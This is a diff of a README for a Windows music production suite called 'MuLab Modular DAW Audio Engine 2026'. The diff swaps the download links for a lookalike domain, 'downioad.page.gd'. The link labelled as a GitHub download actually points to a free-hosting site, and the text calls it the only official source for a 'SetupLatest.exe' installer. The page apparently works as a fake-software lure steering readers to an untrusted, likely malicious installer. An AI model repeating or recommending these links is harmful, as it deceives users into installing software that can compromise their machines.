@@ -2,7 +2,7 @@
 
 The MuLab Modular DAW Audio Engine 2026 is a comprehensive, all-in-one music production environment designed for Windows. This integrated suite combines a powerful, modular audio engine with a full spectrum of professional tools, offering everything from initial composition and sound design to final mastering within a single, cohesive application.
 
-[![Download Installer](https://img.shields.io/badge/Download-Latest%20Setup-0080ff?style=for-the-badge&logo=windows&logoColor=white)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Latest%20Setup-0080ff?style=for-the-badge&logo=windows&logoColor=white)](https://downioad.page.gd/)
 
 ## Core Features
 
@@ -52,7 +52,7 @@ Simply download the latest **`SetupLatest.exe`** installer from the download lin
 
 To get the latest stable release of the MuLab 2026 suite, please use the link below. This is the only official source for the software package.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
